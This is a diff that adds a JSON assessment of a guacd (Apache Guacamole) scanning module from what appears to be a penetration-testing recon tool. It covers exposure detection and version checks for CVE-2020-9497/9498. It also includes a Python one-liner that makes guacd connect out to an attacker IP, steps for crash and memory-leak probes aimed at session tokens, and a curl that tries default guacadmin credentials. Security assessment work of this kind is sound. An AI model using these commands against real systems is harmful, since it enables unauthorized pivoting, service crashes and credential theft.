@@ -1,0 +1,66 @@
+{
+  "service": "guacamole",
+  "summary": "Complete guacd wire speaker: encode/decode of the LENGTH.VALUE opcode, sends select,<backend> per protocol and records which backends return `args` (built-in plugins). Extracts VERSION_x_y_z from args frames and gates two version-bracket CVEs (2020-9497/9498). Strong T1 for exposure (any response off-loopback proves no-auth reachability, which is the whole vuln); CVEs are T0 today (banner-derived). Biggest gap: no SSRF-pivot proof - never actually asks guacd to connect outward to a canary IP:port to prove the pivot works; the CVE claims are unvalidated version brackets with no memory-corruption or leak probe.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/guacamole.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "relay_targets",
+    "known_users",
+    "loot_store"
+  ],
+  "findings": [
+    {
+      "kind": "guacd_exposed",
+      "title_pattern": "guacd reachable off-loopback (no authentication, arbitrary pivot)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Server answered `select,vnc` with an `args` opcode - deterministic proof that guacd is reachable and has no authentication of its own (which is by design). One roundtrip, non-destructive.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Full T2 SSRF proof: after `select,rdp`, send the `size,audio,video,image,timezone,args` handshake with hostname=<attacker-canary-ip>, port=<canary-port>, and observe an inbound TCP connect on the canary listener. Wire that through relay_targets to mark reachable internal RDP/VNC/SSH/kubernetes targets guacd can route to.",
+      "promotion_risk": "medium",
+      "related_cves": [],
+      "tester_next_step": "python3 -c 'import socket;s=socket.create_connection((\"<ip>\",<port>));s.sendall(b\"6.select,3.rdp;\");print(s.recv(4096));s.sendall(b\"4.size,4.1024,3.768,2.96;5.audio,0;5.video,0;5.image,0;8.timezone,0;8.hostname,15.<attacker-ip>,4.port,4.3389,7.security,3.any;\");print(s.recv(4096))'   # watch tcpdump -ni any port 3389 on the attacker"
+    },
+    {
+      "kind": "guacd_cve_2020_9498",
+      "title_pattern": "Apache Guacamole guacd < 1.2.0 pre-auth RCE (CVE-2020-9498)",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Fires purely on VERSION_x_y_z parsed from the args frame + strict-less-than 1.2.0. No UAF probe, no crash trigger.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Send the crafted static-virtual-channel RDP frame from the Check Point 'Reverse RDP' PoC (guac_common_svc_process_receive UAF) and look for a service restart / socket close within the window. Full T3 needs a shellcode payload; keep T2 as 'crash observed'.",
+      "promotion_risk": "destructive",
+      "related_cves": [
+        "CVE-2020-9498"
+      ],
+      "tester_next_step": "See Check Point 2020-07-02 write-up 'Reverse RDP - The Path Not Taken'; PoC at github.com/checkpoint-research/CVE-2020-9498. Lab-only - it heap-corrupts guacd."
+    },
+    {
+      "kind": "guacd_cve_2020_9497",
+      "title_pattern": "Apache Guacamole guacd < 1.2.0 memory disclosure (CVE-2020-9497)",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Same version-bracket gate as 9498; no leak probe.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Send the length-mismatched SVC packet from the disclosed PoC and search the returned bytes for likely session-token / heap-pointer material. Non-destructive but noisy in guacd logs.",
+      "promotion_risk": "medium",
+      "related_cves": [
+        "CVE-2020-9497"
+      ],
+      "tester_next_step": "Same Check Point research repo - the mem-disclosure variant of the crafted SVC frame; grep the leaked bytes for JSESSIONID / bearer strings."
+    },
+    {
+      "kind": "guacd_fingerprint",
+      "title_pattern": "guacd fingerprint",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Version + supported-backends enumeration; no vuln claim.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Correct as info. The `backends_ok` list feeds the exposed finding's detail and could feed relay_targets to say 'this guacd can route to RDP/SSH/kubernetes'.",
+      "promotion_risk": "none",
+      "related_cves": [],
+      "tester_next_step": "curl -sk https://<ip>:8443/guacamole/api/tokens -d 'username=guacadmin&password=guacadmin'   # co-located web tier often ships with default creds; a token here is a full T3 into every registered connection."
+    }
+  ]
+}
